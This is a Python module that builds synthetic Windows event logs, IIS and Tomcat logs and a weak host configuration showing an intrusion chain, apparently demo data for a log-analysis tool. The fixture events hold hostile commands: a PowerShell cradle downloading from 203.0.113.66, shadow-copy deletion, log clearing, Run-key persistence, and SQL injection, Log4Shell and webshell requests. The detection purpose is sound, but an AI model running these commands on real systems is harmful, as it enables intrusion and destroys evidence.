"""内置演示数据：构造一条完整的入侵链，用于自检与展示。

数据全部为合成事件，主机名、账户、IP 均指向保留地址/示例域名，
不包含任何真实环境信息。
"""

from __future__ import annotations

import datetime as dt
from dataclasses import dataclass
from xml.sax.saxutils import escape, quoteattr

UTC = dt.timezone.utc
NS = "http://schemas.microsoft.com/win/2004/08/events/event"
ATTACKER = "203.0.113.66"
WEB_ATTACKER = "198.51.100.23"
INTERNAL = "10.0.0.77"


@dataclass
class DemoData:
    target: str
    security: str
    system: str
    powershell: str
    defender: str
    rdp_lsm: str
    iis: str
    tomcat: str
    posture: dict


_MONTHS = ("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")


class _Builder:
    def __init__(self, computer: str):
        self.computer = computer
        self.record = 1000
        self.events: dict[str, list[str]] = {
            "security": [],
            "system": [],
            "powershell": [],
            "defender": [],
            "rdp_lsm": [],
        }

    def event(
        self,
        log: str,
        event_id: int,
        when: dt.datetime,
        data: dict,
        provider: str,
        level: int = 0,
    ) -> None:
        self.record += 1
        channel = {
            "security": "Security",
            "system": "System",
            "powershell": "Microsoft-Windows-PowerShell/Operational",
            "defender": "Microsoft-Windows-Windows Defender/Operational",
            "rdp_lsm": (
                "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational"
            ),
        }[log]
        stamp = when.astimezone(UTC).strftime("%Y-%m-%dT%H:%M:%S.") + (
            f"{when.microsecond:06d}0Z"
        )
        payload = "".join(
            f"<Data Name={quoteattr(str(name))}>{escape(str(value))}</Data>"
            for name, value in data.items()
            if value is not None
        )
        xml = (
            f"<Event xmlns={quoteattr(NS)}><System>"
            f"<Provider Name={quoteattr(provider)}/>"
            f"<EventID>{event_id}</EventID><Version>0</Version><Level>{level}</Level>"
            f"<TimeCreated SystemTime={quoteattr(stamp)}/>"
            f"<EventRecordID>{self.record}</EventRecordID>"
            f"<Channel>{escape(channel)}</Channel>"
            f"<Computer>{escape(self.computer)}</Computer>"
            f"</System><EventData>{payload}</EventData></Event>"
        )
        self.events[log].append(xml)

    def user_event(
        self,
        event_id: int,
        when: dt.datetime,
        user: str,
        address: str,
        session_id: str = "3",
    ) -> None:
        self.record += 1
        stamp = when.astimezone(UTC).strftime("%Y-%m-%dT%H:%M:%S.") + (
            f"{when.microsecond:06d}0Z"
        )
        xml = (
            f"<Event xmlns={quoteattr(NS)}><System>"
            f"<Provider Name='Microsoft-Windows-TerminalServices-LocalSessionManager'/>"
            f"<EventID>{event_id}</EventID><Version>0</Version><Level>4</Level>"
            f"<TimeCreated SystemTime={quoteattr(stamp)}/>"
            f"<EventRecordID>{self.record}</EventRecordID>"
            f"<Channel>Microsoft-Windows-TerminalServices-LocalSessionManager/Operational</Channel>"
            f"<Computer>{escape(self.computer)}</Computer>"
            f"</System><UserData><EventXML xmlns='Event_NS'>"
            f"<User>{escape(user)}</User><SessionID>{escape(session_id)}</SessionID>"
            f"<Address>{escape(address)}</Address></EventXML></UserData></Event>"
        )
        self.events["rdp_lsm"].append(xml)

    def render(self) -> dict[str, str]:
        return {key: "\n".join(value) for key, value in self.events.items()}


def _tomcat_logs(base: dt.datetime) -> str:
    def access_time(offset: int) -> str:
        stamp = base + dt.timedelta(minutes=offset)
        return (
            f"{stamp.day:02d}/{_MONTHS[stamp.month - 1]}/{stamp.year}:"
            f"{stamp.strftime('%H:%M:%S')} +0800"
        )

    def catalina_time(offset: int) -> str:
        stamp = base + dt.timedelta(minutes=offset)
        return (
            f"{stamp.day:02d}-{_MONTHS[stamp.month - 1]}-{stamp.year} "
            f"{stamp.strftime('%H:%M:%S')}.000"
        )

    lines = ["@@@WLAFILE C:\\tomcat\\logs\\localhost_access_log.2026-11-20.log"]
    ua = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)"
    normal = "10.0.0.20"

    def add(offset: int, ip: str, method: str, uri: str, status: int, agent: str = ua):
        lines.append(
            f'{ip} - - [{access_time(offset)}] "{method} {uri} HTTP/1.1" '
            f'{status} {256 + offset % 500} "-" "{agent}"'
        )

    for index in range(12):
        add(index, normal, "GET", "/portal/index.jsp", 200)
    # Manager 爆破
    for index in range(12):
        add(20 + index, ATTACKER, "GET", "/manager/html", 401)
    # 目录枚举
    for index in range(32):
        add(40 + index, WEB_ATTACKER, "GET", f"/admin/backup{index}.zip", 404)
    # 常见 Web 攻击
    add(80, WEB_ATTACKER, "GET", "/item.jsp?id=1%27+UNION+SELECT+password+FROM+users--", 500)
    add(81, WEB_ATTACKER, "GET", "/download?file=../../WEB-INF/web.xml", 200)
    add(82, WEB_ATTACKER, "GET", "/search?q=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.23%2Fa%7D", 200)
    add(83, ATTACKER, "GET", "/upload/shell.jsp?cmd=whoami", 200)
    add(84, ATTACKER, "PUT", "/shell.jsp/", 201)
    add(85, ATTACKER, "PUT", "/manager/text/deploy?path=/ROOT&war=file:/tmp/upload/ROOT.war", 200)
    add(86, WEB_ATTACKER, "GET", "/.git/config", 404)
    lines.append("@@@WLAFILE C:\\tomcat\\logs\\catalina.2026-11-20.log")
    lines.extend(
        [
            f"{catalina_time(0)} INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version name:   Apache Tomcat/8.5.24",
            f"{catalina_time(0)} INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Java Home:             C:\\Program Files\\Java\\jdk1.8.0_201\\jre",
            f"{catalina_time(1)} INFO [main] org.apache.catalina.startup.HostConfig.deployWAR Deploying web application archive [/tmp/upload/ROOT.war]",
            f'{catalina_time(2)} SEVERE [http-nio-8080-exec-5] org.apache.catalina.core.ContainerBase.[Catalina].[localhost].[/].log Servlet.service() for servlet [jsp] threw exception',
            ' javax.naming.InitialContext.lookup("ldap://203.0.113.66:1389/Exploit")',
            "     at javax.naming.InitialContext.lookup(InitialContext.java:417)",
            "     at org.apache.jsp.index_jsp._jspService(index_jsp.java:88)",
            f"{catalina_time(3)} SEVERE [http-nio-8080-exec-8] org.apache.catalina.core.StandardWrapperValve.invoke Servlet.service() for servlet [jsp] threw exception",
            " java.lang.OutOfMemoryError: Java heap space",
            f"{catalina_time(4)} WARNING [http-nio-8080-exec-9] org.apache.coyote.AbstractProcessor.parseRequest Invalid character found in the request target",
            f"{catalina_time(5)} WARNING [http-nio-8080-exec-10] org.apache.coyote.AbstractProcessor.parseRequest Invalid character found in the request target",
            f"{catalina_time(6)} WARNING [http-nio-8080-exec-11] org.apache.coyote.AbstractProcessor.parseRequest Invalid character found in the request target",
            f"{catalina_time(7)} WARNING [http-nio-8080-exec-12] org.apache.coyote.AbstractProcessor.parseRequest Invalid character found in the request target",
            f"{catalina_time(8)} WARNING [http-nio-8080-exec-13] org.apache.coyote.AbstractProcessor.parseRequest Invalid character found in the request target",
        ]
    )
    return "\n".join(lines)


def _iis_logs(base: dt.datetime) -> str:
    header = (
        "#Software: Microsoft Internet Information Services 10.0\n"
        "#Version: 1.0\n"
        f"#Date: {base.strftime('%Y-%m-%d %H:%M:%S')}\n"
        "#Fields: date time s-ip cs-method cs-uri-stem cs-uri-query s-port "
        "cs-username c-ip cs(User-Agent) sc-status sc-substatus sc-win32-status time-taken\n"
    )
    lines = [header]
    normal_ua = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)"

    def add(offset: int, ip: str, method: str, uri: str, query: str, status: int, ua: str):
        stamp = base + dt.timedelta(minutes=offset)
        lines.append(
            f"{stamp.strftime('%Y-%m-%d %H:%M:%S')} 10.0.0.50 {method} {uri} "
            f"{query or '-'} 80 - {ip} {ua} {status} 0 0 {37 + offset % 90}\n"
        )

    # 正常业务流量
    for index in range(20):
        add(index * 3, "10.0.0.20", "GET", "/Default.aspx", "", 200, normal_ua)
    # 扫描器与路径枚举
    scanner = "sqlmap/1.7.2#stable+(https://sqlmap.org)"
    for index in range(36):
        add(120 + index, WEB_ATTACKER, "GET", f"/admin/backup{index}.zip", "", 404, normal_ua)
    for index in range(4):
        add(200 + index, WEB_ATTACKER, "GET", f"/old/site{index}.php", "", 404, "Nmap+Scripting+Engine")
    # SQL 注入 / 路径穿越 / Log4Shell
    add(240, WEB_ATTACKER, "GET", "/Product.aspx", "id=1%27+UNION+SELECT+username%2Cpassword+FROM+users--", 500, scanner)
    add(241, WEB_ATTACKER, "GET", "/Product.aspx", "id=1+AND+SLEEP%285%29", 200, scanner)
    add(242, WEB_ATTACKER, "GET", "/download.aspx", "file=..%2f..%2fwindows%2fwin.ini", 200, normal_ua)
    add(243, WEB_ATTACKER, "GET", "/Default.aspx", "x=%24%7Bjndi%3Aldap%3A%2f%2f198.51.100.23%2fa%7D", 200, normal_ua)
    # WebShell 访问
    add(260, WEB_ATTACKER, "POST", "/upload/shell.aspx", "cmd=whoami", 200, "Mozilla/5.0")
    add(261, WEB_ATTACKER, "GET", "/upload/shell.aspx", "cmd=net+user", 200, "Mozilla/5.0")
    return "".join(lines)


def build_demo() -> DemoData:
    """构造演示事件（最近 3 天内的入侵链）。"""
    now = dt.datetime.now(UTC).replace(microsecond=0)
    base = now - dt.timedelta(days=3)
    builder = _Builder("WIN-DEMO01")
    sec_provider = "Microsoft-Windows-Security-Auditing"

    def at(minutes: int, seconds: int = 0) -> dt.datetime:
        return base + dt.timedelta(minutes=minutes, seconds=seconds)

    # ---- 1. 公网 RDP 暴力破解 ----
    for index in range(12):
        builder.event(
            "security",
            4625,
            at(index, index * 7),
            {
                "SubjectUserSid": "S-1-0-0",
                "TargetUserName": "Administrator",
                "TargetDomainName": "WIN-DEMO01",
                "Status": "0xc000006d",
                "SubStatus": "0xc000006a",
                "LogonType": "10",
                "WorkstationName": "KALI-ATTACK",
                "IpAddress": ATTACKER,
                "IpPort": str(50000 + index),
                "LogonProcessName": "User32",
                "AuthenticationPackageName": "Negotiate",
            },
            sec_provider,
            level=0,
        )
    builder.event(
        "security",
        4624,
        at(14),
        {
            "SubjectUserSid": "S-1-0-0",
            "TargetUserName": "Administrator",
            "TargetDomainName": "WIN-DEMO01",
            "LogonType": "10",
            "WorkstationName": "KALI-ATTACK",
            "IpAddress": ATTACKER,
            "IpPort": "50123",
            "LogonProcessName": "User32",
            "AuthenticationPackageName": "Negotiate",
        },
        sec_provider,
    )
    builder.event(
        "security",
        4672,
        at(14, 5),
        {
            "SubjectUserSid": "S-1-5-21-100-500",
            "SubjectUserName": "Administrator",
            "SubjectDomainName": "WIN-DEMO01",
            "PrivilegeList": "SeSecurityPrivilege SeBackupPrivilege SeDebugPrivilege",
        },
        sec_provider,
    )
    builder.user_event(21, at(14, 2), "WIN-DEMO01\\Administrator", ATTACKER, "3")
    builder.user_event(22, at(14, 10), "WIN-DEMO01\\Administrator", "本地", "3")

    # ---- 2. 创建后门账户并加入管理员组 ----
    builder.event(
        "security",
        4720,
        at(20),
        {
            "TargetUserName": "helpdesk_svc",
            "TargetDomainName": "WIN-DEMO01",
            "SubjectUserName": "Administrator",
            "SubjectDomainName": "WIN-DEMO01",
            "SamAccountName": "helpdesk_svc",
        },
        sec_provider,
    )
    builder.event(
        "security",
        4732,
        at(23),
        {
            "MemberName": "CN=helpdesk_svc,CN=Users,DC=win-demo01",
            "MemberSid": "S-1-5-21-100-1678",
            "TargetUserName": "Administrators",
            "TargetDomainName": "Builtin",
            "SubjectUserName": "Administrator",
            "SubjectDomainName": "WIN-DEMO01",
        },
        sec_provider,
    )
    builder.event(
        "security",
        4720,
        at(26),
        {
            "TargetUserName": "svc_backup",
            "TargetDomainName": "WIN-DEMO01",
            "SubjectUserName": "helpdesk_svc",
            "SamAccountName": "svc_backup",
        },
        sec_provider,
    )

    # ---- 3. 服务 / 计划任务持久化 ----
    builder.event(
        "system",
        7045,
        at(30),
        {
            "ServiceName": "WinUpdSvc",
            "ImagePath": "C:\\Users\\Public\\svchost.exe",
            "ServiceType": "用户模式服务",
            "StartType": "自动",
            "AccountName": "LocalSystem",
        },
        "Service Control Manager",
        level=4,
    )
    builder.event(
        "security",
        4698,
        at(35),
        {
            "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\SystemCheck",
            "TaskContent": (
                "<Task><Actions><Exec><Command>powershell.exe</Command>"
                "<Arguments>-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
                "</Arguments></Exec></Actions></Task>"
            ),
            "SubjectUserName": "helpdesk_svc",
            "SubjectDomainName": "WIN-DEMO01",
        },
        sec_provider,
    )
    builder.event(
        "security",
        4697,
        at(37),
        {
            "ServiceName": "PSEXESVC",
            "ServiceFileName": "C:\\Windows\\PSEXESVC.exe",
            "ServiceType": "用户模式服务",
            "ServiceStartType": "按需",
            "ServiceAccount": "LocalSystem",
            "SubjectUserName": "helpdesk_svc",
        },
        sec_provider,
    )

    # ---- 4. 命令执行与凭据/破坏行为 ----
    processes = [
        (
            40,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
            "C:\\Windows\\System32\\cmd.exe",
            "helpdesk_svc",
        ),
        (
            41,
            "C:\\Windows\\System32\\whoami.exe",
            "whoami /all",
            "C:\\Windows\\System32\\cmd.exe",
            "helpdesk_svc",
        ),
        (
            42,
            "C:\\Windows\\System32\\net.exe",
            "net user helpdesk_svc P@ssw0rd! /add",
            "C:\\Windows\\System32\\cmd.exe",
            "helpdesk_svc",
        ),
        (
            43,
            "C:\\Windows\\System32\\vssadmin.exe",
            "vssadmin delete shadows /all /quiet",
            "C:\\Windows\\System32\\cmd.exe",
            "helpdesk_svc",
        ),
        (
            44,
            "C:\\Windows\\System32\\wevtutil.exe",
            "wevtutil cl Security",
            "C:\\Windows\\System32\\cmd.exe",
            "helpdesk_svc",
        ),
        (
            45,
            "C:\\Windows\\System32\\reg.exe",
            "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Users\\Public\\svchost.exe /f",
            "C:\\Windows\\System32\\cmd.exe",
            "helpdesk_svc",
        ),
    ]
    for minutes, image, command, parent, user in processes:
        builder.event(
            "security",
            4688,
            at(minutes),
            {
                "SubjectUserName": user,
                "SubjectDomainName": "WIN-DEMO01",
                "NewProcessName": image,
                "CommandLine": command,
                "ParentProcessName": parent,
                "TokenElevationType": "%%1936",
            },
            sec_provider,
        )

    # ---- 4.1 后门账户登录与共享访问 ----
    builder.event(
        "security",
        4624,
        at(60),
        {
            "TargetUserName": "helpdesk_svc",
            "TargetDomainName": "WIN-DEMO01",
            "LogonType": "3",
            "WorkstationName": "WIN-DEMO02",
            "IpAddress": INTERNAL,
            "AuthenticationPackageName": "NTLM",
        },
        sec_provider,
    )
    for index in range(3):
        builder.event(
            "security",
            5145,
            at(62, index),
            {
                "ShareName": "ADMIN$",
                "RelativeTargetName": "svchost.exe",
                "SubjectUserName": "helpdesk_svc",
                "SubjectDomainName": "WIN-DEMO01",
                "IpAddress": INTERNAL,
                "AccessMask": "0x2",
            },
            sec_provider,
        )

    # ---- 5. 清理日志与防御规避 ----
    builder.event(
        "security",
        1102,
        at(46),
        {
            "SubjectUserSid": "S-1-5-21-100-1678",
            "SubjectUserName": "helpdesk_svc",
            "SubjectDomainName": "WIN-DEMO01",
        },
        sec_provider,
        level=4,
    )
    builder.event(
        "security",
        4719,
        at(47),
        {
            "SubjectUserName": "helpdesk_svc",
            "CategoryId": "%%8274",
            "SubcategoryId": "%%12546",
            "SubcategoryGuid": "{0cce9216-69ae-11d9-bed3-505054503030}",
        },
        sec_provider,
    )
    builder.event(
        "security",
        4657,
        at(48),
        {
            "ObjectName": "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
            "ObjectValueName": "Updater",
            "NewValue": "C:\\Users\\Public\\svchost.exe",
            "OperationType": "Existing value modified",
            "SubjectUserName": "helpdesk_svc",
        },
        sec_provider,
    )

    # ---- 6. PowerShell 脚本块 ----
    script = (
        "$c = New-Object Net.WebClient; "
        "IEX $c.DownloadString('http://203.0.113.66/payload.ps1')"
    )
    builder.event(
        "powershell",
        4104,
        at(50),
        {
            "MessageNumber": "1",
            "MessageTotal": "1",
            "ScriptBlockText": script,
            "ScriptBlockId": "{a1b2c3d4-0000-0000-0000-000000000001}",
            "Path": "",
        },
        "Microsoft-Windows-PowerShell",
        level=3,
    )

    # ---- 7. Defender 检出 ----
    builder.event(
        "defender",
        1116,
        at(52),
        {
            "Product Name": "Microsoft Defender Antivirus",
            "Threat Name": "Trojan:Win32/Beacon",
            "Severity": "Severe",
            "Detection Type": "Real-Time",
            "Path": "file:_C:\\Users\\Public\\svchost.exe",
            "Process Name": "C:\\Windows\\System32\\cmd.exe",
            "Action Name": "Quarantine",
        },
        "Microsoft-Windows-Windows Defender",
        level=3,
    )

    # ---- 8. 横向移动与 Kerberoasting ----
    builder.event(
        "security",
        4624,
        at(70),
        {
            "TargetUserName": "ANONYMOUS LOGON",
            "TargetDomainName": "NT AUTHORITY",
            "LogonType": "3",
            "WorkstationName": "WIN-DEMO02",
            "IpAddress": INTERNAL,
            "AuthenticationPackageName": "NTLM",
        },
        sec_provider,
    )
    for index in range(6):
        builder.event(
            "security",
            4769,
            at(75 + index),
            {
                "TargetUserName": "svc_sql",
                "ServiceName": f"HTTP/web{index}.corp.local",
                "TicketEncryptionType": "0x17",
                "IpAddress": INTERNAL,
                "Status": "0x0",
            },
            sec_provider,
        )
    for index in range(12):
        builder.event(
            "security",
            4776,
            at(80, index),
            {
                "TargetUserName": "svc_sql",
                "Workstation": "WIN-DEMO02",
                "Status": "0xc000006a",
            },
            sec_provider,
        )

    # ---- 9. 系统稳定性 ----
    builder.event(
        "system",
        1074,
        at(100),
        {
            "param1": "C:\\Windows\\System32\\shutdown.exe",
            "param2": "WIN-DEMO01\\helpdesk_svc",
            "param3": "0x80040002",
            "param4": "其他（计划外）",
        },
        "User32",
        level=4,
    )
    builder.event(
        "system",
        41,
        at(101),
        {"BugcheckCode": "0", "PowerButtonTimestamp": "0"},
        "Microsoft-Windows-Kernel-Power",
        level=1,
    )
    builder.event(
        "system",
        7040,
        at(102),
        {
            "param1": "WinUpdSvc",
            "param2": "手动",
            "param3": "自动",
            "param4": "WinUpdSvc",
        },
        "Service Control Manager",
        level=4,
    )

    # ---- 10. 本地/内网 RDP 会话 ----
    builder.user_event(21, at(110), "WIN-DEMO01\\itadmin", "10.0.0.77", "5")
    builder.user_event(24, at(140), "WIN-DEMO01\\itadmin", "10.0.0.77", "5")
    builder.user_event(25, at(145), "WIN-DEMO01\\itadmin", "10.0.0.77", "5")

    posture = {
        "hostname": "WIN-DEMO01",
        "os": "Windows Server 2019 Datacenter",
        "domain": "corp.local",
        "arch": "x64-based PC",
        "uptime_days": 2.4,
        "defender": {
            "realtime": False,
            "antivirus": True,
            "behavior": False,
            "tamper": False,
        },
        "defender_exclusions": ["C:\\Users\\Public", "C:\\inetpub\\wwwroot\\upload"],
        "rdp_enabled": True,
        "rdp_nla": False,
        "rdp_port": 3389,
        "smb1": True,
        "lsa_protection": False,
        "wdigest": 1,
        "always_install_elevated": True,
        "autoadminlogon": False,
        "guest_enabled": True,
        "powershell_logging": {
            "script_block": True,
            "module": False,
            "transcription": False,
        },
        "audit": {"command_line": True},
        "sysmon": "NotInstalled",
        "local_admins": [
            "CORP\\Administrator",
            "CORP\\helpdesk_svc",
            "CORP\\svc_backup",
            "CORP\\itadmin",
            "CORP\\sqlsvc",
            "CORP\\websvc",
        ],
        "firewall": [
            {"name": "Domain", "enabled": True},
            {"name": "Private", "enabled": False},
            {"name": "Public", "enabled": True},
        ],
        "logs": [
            {"name": "Security", "enabled": True, "records": 128394, "size": 1073741824},
            {"name": "System", "enabled": True, "records": 20411, "size": 20971520},
        ],
    }

    rendered = builder.render()
    return DemoData(
        target="WIN-DEMO01",
        security=rendered["security"],
        system=rendered["system"],
        powershell=rendered["powershell"],
        defender=rendered["defender"],
        rdp_lsm=rendered["rdp_lsm"],
        iis=_iis_logs(base + dt.timedelta(hours=2)),
        tomcat=_tomcat_logs(base + dt.timedelta(hours=3)),
        posture=posture,
    )
